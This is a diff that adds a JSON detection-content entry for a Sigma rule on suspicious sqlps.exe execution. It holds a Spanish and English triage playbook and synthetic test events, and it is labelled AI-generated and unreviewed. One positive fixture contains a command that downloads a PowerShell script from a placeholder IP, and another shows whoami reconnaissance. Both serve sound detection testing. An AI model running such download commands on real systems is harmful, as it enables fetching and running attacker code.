@@ -1,0 +1,141 @@
+{
+  "rule": {
+    "id": "0152550d-3a26-4efd-9f0e-54a0b28ae2f3",
+    "title": "Detection of PowerShell Execution via Sqlps.exe",
+    "level": "medium",
+    "status": "test",
+    "author": "Agro (@agro_sev) oscd.community",
+    "path": "windows/process_creation/proc_creation_win_mssql_sqlps_susp_execution.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_mssql_sqlps_susp_execution.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1059.001",
+      "T1127"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó sqlps.exe, la shell de PowerShell incluida con MSSQL Server, fuera de un trabajo de SQL Server Agent, o sqlps.exe creó un proceso hijo. Puede indicar ejecución de PowerShell que evita el registro de script blocks.",
+      "what_it_detects": "Eventos de creación de procesos en los que Image termina en \\sqlps.exe u OriginalFileName es sqlps.exe y ParentImage no es \\sqlagent.exe, o en los que ParentImage termina en \\sqlps.exe, es decir, cualquier proceso hijo de sqlps.exe.",
+      "why_it_matters": "sqlps.exe es un binario firmado de Microsoft que ejecuta código PowerShell (T1059.001) sin generar logs de script block. Un atacante puede usarlo como proxy de ejecución confiable (T1127) para evadir controles basados en PowerShell.",
+      "triage_steps": [
+        "Revise CommandLine de sqlps.exe o del proceso hijo: busque -Command, -EncodedCommand, descargas, rutas temporales o comandos de reconocimiento.",
+        "Identifique ParentImage: cmd.exe, explorer.exe, w3wp.exe, sqlservr.exe o macros de Office son más sospechosos que una consola de administración conocida.",
+        "Confirme el usuario y el host: ¿es un DBA o una cuenta de servicio de SQL en un servidor de base de datos esperado?",
+        "Verifique la ruta y el hash de sqlps.exe; una copia fuera de la carpeta Tools\\Binn de SQL Server es muy sospechosa.",
+        "Pivote en el mismo host +/- 15 minutos: procesos hijos, conexiones de red, archivos creados y cambios de persistencia.",
+        "Busque alertas previas para el mismo usuario, host o hash, incluida ejecución de PowerShell o LOLBins.",
+        "Consulte con el equipo de bases de datos si existe un cambio o mantenimiento programado que lo explique."
+      ],
+      "false_positives": [
+        "Trabajos de SQL Server Agent con pasos de PowerShell, cuyo sqlps.exe hijo de sqlagent.exe ya se excluye, pero sus procesos nietos sí alertan.",
+        "DBA que usan sqlps.exe de forma interactiva para tareas de administración documentadas.",
+        "Scripts de despliegue o monitoreo de SQL Server que invocan sqlps.exe desde herramientas de automatización aprobadas."
+      ],
+      "response_steps": [
+        "Valide con el responsable del host y el usuario si la ejecución fue autorizada antes de actuar.",
+        "Si no es legítima, aísle el endpoint y preserve memoria, eventos de proceso y archivos referenciados en CommandLine.",
+        "Elimine payloads, tareas programadas o persistencia creados, y restablezca credenciales de la cuenta implicada.",
+        "Restrinja sqlps.exe con WDAC o AppLocker en equipos que no necesitan administración de SQL, y documente la exclusión de casos legítimos."
+      ],
+      "severity_rationale": "Nivel medio: la ejecución directa de sqlps.exe es poco común e indica posible evasión, pero existen usos administrativos legítimos que requieren validación."
+    },
+    "en": {
+      "summary": "sqlps.exe, the PowerShell host shipped with MSSQL Server, ran outside a SQL Server Agent job, or sqlps.exe spawned a child process. This may be PowerShell execution that avoids script block logging.",
+      "what_it_detects": "Process creation events where Image ends with \\sqlps.exe or OriginalFileName is sqlps.exe and ParentImage is not \\sqlagent.exe, or where ParentImage ends with \\sqlps.exe, meaning any child of sqlps.exe.",
+      "why_it_matters": "sqlps.exe is a Microsoft-signed binary that runs PowerShell code (T1059.001) without script block logs. Attackers can use it as a trusted proxy (T1127) to slip past PowerShell-focused defenses.",
+      "triage_steps": [
+        "Review the CommandLine of sqlps.exe or its child: look for -Command, -EncodedCommand, downloads, temp paths or reconnaissance commands.",
+        "Check ParentImage: cmd.exe, explorer.exe, w3wp.exe, sqlservr.exe or Office apps are more suspicious than a known admin console.",
+        "Confirm the user and host: is it a DBA or SQL service account on an expected database server?",
+        "Verify sqlps.exe path and hash; a copy outside SQL Server's Tools\\Binn folder is highly suspicious.",
+        "Pivot on the same host +/- 15 minutes: child processes, network connections, file writes and persistence changes.",
+        "Look for earlier alerts for the same user, host or hash, including PowerShell or LOLBin activity.",
+        "Ask the database team whether scheduled maintenance or a change ticket explains it."
+      ],
+      "false_positives": [
+        "SQL Server Agent jobs with PowerShell steps; sqlps.exe under sqlagent.exe is excluded, but its grandchild processes still alert.",
+        "DBAs using sqlps.exe interactively for documented administration tasks.",
+        "Approved deployment or monitoring automation that calls sqlps.exe."
+      ],
+      "response_steps": [
+        "Confirm with the host owner and user whether the execution was authorized before acting.",
+        "If unauthorized, isolate the endpoint and preserve memory, process events and files referenced in CommandLine.",
+        "Remove dropped payloads, scheduled tasks or persistence, and reset credentials for the involved account.",
+        "Restrict sqlps.exe with WDAC or AppLocker on hosts that don't need SQL administration; document tuning for legitimate cases."
+      ],
+      "severity_rationale": "Medium: direct sqlps.exe use is uncommon and suggests evasion, but legitimate administrative use exists and needs validation."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "sqlps.exe launched from cmd.exe running an inline PowerShell download command (selection_image, parent is not sqlagent.exe).",
+        "event": {
+          "EventID": 1,
+          "UtcTime": "2024-05-14 10:22:31.118",
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Program Files (x86)\\Microsoft SQL Server\\130\\Tools\\Binn\\SQLPS.exe",
+          "OriginalFileName": "SQLPS.exe",
+          "CommandLine": "sqlps.exe -NoLogo -Command \"Invoke-WebRequest -Uri http://203.0.113.10/a.ps1 -OutFile C:\\Users\\Public\\a.ps1\"",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c sqlps.exe -NoLogo -Command ...",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "Child process whoami.exe spawned by sqlps.exe (selection_parent).",
+        "event": {
+          "EventID": 1,
+          "UtcTime": "2024-05-14 10:23:05.402",
+          "Computer": "SQL-02.andes.example.com",
+          "User": "ANDES\\svc_sqlops",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "OriginalFileName": "whoami.exe",
+          "CommandLine": "\"C:\\Windows\\system32\\whoami.exe\" /all",
+          "ParentImage": "C:\\Program Files (x86)\\Microsoft SQL Server\\130\\Tools\\Binn\\SQLPS.exe",
+          "ParentCommandLine": "SQLPS.exe -NoLogo",
+          "IntegrityLevel": "High"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "sqlps.exe started by SQL Server Agent for a PowerShell job step; excluded by filter_image.",
+        "event": {
+          "EventID": 1,
+          "UtcTime": "2024-05-14 02:00:00.015",
+          "Computer": "SQL-02.andes.example.com",
+          "User": "ANDES\\svc_sqlagent",
+          "Image": "C:\\Program Files (x86)\\Microsoft SQL Server\\130\\Tools\\Binn\\SQLPS.exe",
+          "OriginalFileName": "SQLPS.exe",
+          "CommandLine": "SQLPS.exe -NoLogo -NoProfile -Command \"& 'D:\\Jobs\\nightly_backup_check.ps1'\"",
+          "ParentImage": "C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\MSSQL\\Binn\\SQLAGENT.EXE",
+          "IntegrityLevel": "High"
+        }
+      },
+      {
+        "description": "Regular powershell.exe importing the SQLPS module; neither Image, OriginalFileName nor ParentImage is sqlps.exe.",
+        "event": {
+          "EventID": 1,
+          "UtcTime": "2024-05-14 11:05:44.730",
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "OriginalFileName": "PowerShell.EXE",
+          "CommandLine": "powershell.exe -NoProfile -Command \"Import-Module SQLPS; Get-SqlInstance -ServerInstance SQL-02\"",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
